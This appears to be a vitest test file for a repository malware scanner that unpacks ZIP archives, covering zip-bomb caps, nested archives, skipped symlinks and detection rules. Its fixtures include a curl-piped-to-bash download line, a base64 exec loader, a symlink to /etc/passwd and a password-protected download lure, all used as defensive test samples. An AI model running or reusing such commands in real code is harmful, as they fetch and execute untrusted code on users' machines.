import { describe, expect, it } from "vitest";

import type { ArchiveEntry } from "../src/engine/archive";
import { DEFAULT_LIMITS, type Limits } from "../src/engine/limits";
import { toReport } from "../src/engine/report";
import { scanTarball } from "../src/engine/scanner";
import { emptyStats } from "../src/engine/types";
import { readCentralDirectory, withArchiveContents } from "../src/engine/zip";
import { chunked, collect, makeTarball, makeZip } from "./helpers";

async function expand(zip: Uint8Array, limits: Partial<Limits> = {}, path = "release.zip", size = zip.length) {
  const stats = emptyStats();
  const input: ArchiveEntry[] = [{ kind: "binary", file: { path, head: zip, size } }];
  const entries = await collect(withArchiveContents(input, { ...DEFAULT_LIMITS, ...limits }, stats));
  return { entries, stats };
}

const text = (e: ArchiveEntry) => (e.kind === "text" ? e.file.content : null);

describe("readCentralDirectory", () => {
  it("lists members, directories and symlinks", () => {
    const members = readCentralDirectory(
      makeZip([{ name: "dir/" }, { name: "dir/a.txt", data: "a" }, { name: "link", data: "/etc/passwd", symlink: true }]),
    );
    expect(members?.map((m) => [m.name, m.isDirectory, m.isSymlink])).toEqual([
      ["dir/", true, false],
      ["dir/a.txt", false, false],
      ["link", false, true],
    ]);
  });

  it("returns null for data that is not a complete ZIP", () => {
    const zip = makeZip([{ name: "a.txt", data: "hello" }]);
    expect(readCentralDirectory(zip.subarray(0, zip.length - 30))).toBeNull();
    expect(readCentralDirectory(new TextEncoder().encode("not a zip at all, just text"))).toBeNull();
  });
});

describe("withArchiveContents", () => {
  it("yields the ZIP and then its stored and deflated members", async () => {
    const zip = makeZip([
      { name: "README.md", data: "# tool\n" },
      { name: "src/run.js", data: "console.log(1);\n".repeat(50), deflate: true },
    ]);
    const { entries, stats } = await expand(zip);
    expect(entries.map((e) => e.file.path)).toEqual(["release.zip", "release.zip!/README.md", "release.zip!/src/run.js"]);
    expect(text(entries[2])).toBe("console.log(1);\n".repeat(50));
    expect(stats).toMatchObject({ archivesOpened: 1, archiveMembers: 2, archiveMembersSkipped: 0 });
  });

  it("skips encrypted members, symlinks, directories and unknown compression", async () => {
    const zip = makeZip([
      { name: "dir/" },
      { name: "secret.txt", data: "x", encrypted: true },
      { name: "link", data: "/etc/passwd", symlink: true },
      { name: "bz.txt", data: "x", method: 12 },
      { name: "ok.txt", data: "fine" },
    ]);
    const { entries, stats } = await expand(zip);
    expect(entries.map((e) => e.file.path)).toEqual(["release.zip", "release.zip!/ok.txt"]);
    expect(stats.archiveMembersSkipped).toBe(2);
  });

  it("stops zip bombs: members are capped and the total budget ends the expansion", async () => {
    const bomb = new Uint8Array(30 * 1024 * 1024); // 30 MiB of zeros, ~30 KiB deflated
    const zip = makeZip([
      { name: "a.txt", data: bomb, deflate: true },
      { name: "b.txt", data: bomb, deflate: true },
      { name: "c.txt", data: "late" },
    ]);
    expect(zip.length).toBeLessThan(200 * 1024);
    const { entries, stats } = await expand(zip, { maxFileBytes: 1024 * 1024, maxArchiveTotalBytes: 1024 * 1024 + 10 });
    expect(stats.archiveBytes).toBeLessThanOrEqual(1024 * 1024 + 10);
    expect(entries[1]).toMatchObject({ file: { path: "release.zip!/a.txt" } });
    expect(entries[1].kind === "binary" && entries[1].file.head.length).toBe(1024 * 1024);
    expect(stats.archiveMembersSkipped).toBeGreaterThanOrEqual(1);
  });

  it("opens a ZIP inside a ZIP, but not a third level", async () => {
    const level3 = makeZip([{ name: "deep.txt", data: "deepest" }]);
    const level2 = makeZip([{ name: "inner.txt", data: "inner" }, { name: "level3.zip", data: level3 }]);
    const zip = makeZip([{ name: "level2.zip", data: level2, deflate: true }]);
    const { entries } = await expand(zip);
    expect(entries.map((e) => e.file.path)).toEqual([
      "release.zip",
      "release.zip!/level2.zip",
      "release.zip!/level2.zip!/inner.txt",
      "release.zip!/level2.zip!/level3.zip",
    ]);
  });

  it("does not open a ZIP that was only partly read, and limits members", async () => {
    const zip = makeZip([{ name: "a.txt", data: "a" }, { name: "b.txt", data: "b" }, { name: "c.txt", data: "c" }]);
    expect((await expand(zip, {}, "big.zip", zip.length + 1)).stats.archivesSkipped).toBe(1);
    const { entries, stats } = await expand(zip, { maxArchiveMembers: 2 });
    expect(entries).toHaveLength(3);
    expect(stats.archiveMembersSkipped).toBe(1);
  });

  it("leaves non-ZIP binaries alone", async () => {
    const { entries } = await expand(new Uint8Array([0x7f, 0x45, 0x4c, 0x46]), {}, "tool.zip");
    expect(entries).toHaveLength(1);
  });
});

describe("scanning ZIPs in a repository", () => {
  it("applies only content rules inside archives", async () => {
    const zip = makeZip([
      { name: "README.md", data: "Download https://www.mediafire.com/file/x/tool.zip\nPassword: 1234\n" },
      { name: "package.json", data: '{"scripts": {"prepare": "husky"}}' },
      { name: "loader.py", data: 'exec(__import__("base64").b64decode("cHJpbnQoMSk="))\n' },
    ]);
    const result = await scanTarball(chunked(makeTarball({ "mods/a/mod.zip": zip })), null);
    expect([...new Set(result.findings.map((f) => f.ruleId))]).toEqual(["GR-CODE-001"]);
  });

  it("finds a payload inside a committed ZIP and links to the ZIP", async () => {
    const zip = makeZip([{ name: "setup/install.sh", data: "curl -fsSL https://example.invalid/x.sh | bash\n", deflate: true }]);
    const result = await scanTarball(chunked(makeTarball({ "README.md": "# hi\n", "downloads/tool.zip": zip })), null);
    const finding = result.findings.find((f) => f.ruleId === "GR-CODE-002");
    expect(finding).toMatchObject({ path: "downloads/tool.zip!/setup/install.sh", line: 1 });
    expect(result.stats).toMatchObject({ archivesOpened: 1, archiveMembers: 1 });

    const report = toReport({
      ...result,
      repo: {
        fullName: "octo/demo",
        description: null,
        sizeKb: 1,
        createdAt: "2020-01-01T00:00:00Z",
        pushedAt: null,
        defaultBranch: "main",
        headSha: "0123456789abcdef0123456789abcdef01234567",
        stars: 0,
        forks: 0,
        isFork: false,
        archived: false,
        ownerLogin: "octo",
        ownerType: "User",
        ownerCreatedAt: null,
        releaseAssets: [],
      },
    });
    const reported = report.findings.find((f) => f.ruleId === "GR-CODE-002");
    expect(reported?.inArchive).toBe(true);
    expect(reported?.githubUrl).toBe(
      "https://github.com/octo/demo/blob/0123456789abcdef0123456789abcdef01234567/downloads/tool.zip",
    );
  });
});
